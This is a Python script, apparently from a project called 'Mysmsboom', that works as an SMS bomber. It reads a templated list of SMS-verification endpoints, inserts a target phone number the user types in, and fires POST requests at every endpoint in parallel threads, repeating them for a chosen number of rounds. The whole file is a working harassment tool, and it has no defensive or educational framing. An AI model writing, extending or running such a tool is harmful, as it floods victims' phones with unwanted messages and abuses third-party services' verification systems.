import json
from datetime import datetime
import threading

import requests
from jinja2 import FileSystemLoader, Environment
from loguru import logger


def render_template(phone: int | str):
	env = Environment(loader=FileSystemLoader("../Mysmsboom"))
	temp = env.get_template("api.json").render(phone=str(phone), timestamp=str(int(datetime.now().timestamp())))
	text: list = json.loads(temp)
	return text


def send_request(args: dict, lk):
	with lk:
		url, headers, data = args["url"], args["header"], args["data"]
		try:
			if isinstance(args["data"], dict):
				res = requests.post(url=url, json=data, headers=headers, timeout=10)
			else:
				res = requests.post(url=url, data=data, headers=headers, timeout=10)
			try:
				desc = json.dumps(res.json(), ensure_ascii=False).replace("\n", " ")[:30]
			except Exception:
				res.encoding = "utf-8"
				desc = res.text.replace("\n", " ")[:30]
			logger.info(f"{args['desc']}-{desc}")
		except Exception as fp:
			logger.error(f"{args['desc']}-{str(fp)[:30]}")


def main(phone: int | str, frequency: int | str = 1):
	lock = threading.Lock()
	seq = render_template(phone)
	for _ in range(int(frequency)):
		for i in seq:
			threading.Thread(target=send_request, args=(i, lock)).start()


if __name__ == '__main__':
	p = input("请输入手机号:")
	f = input("请输入循环次数:")
	main(p, f)
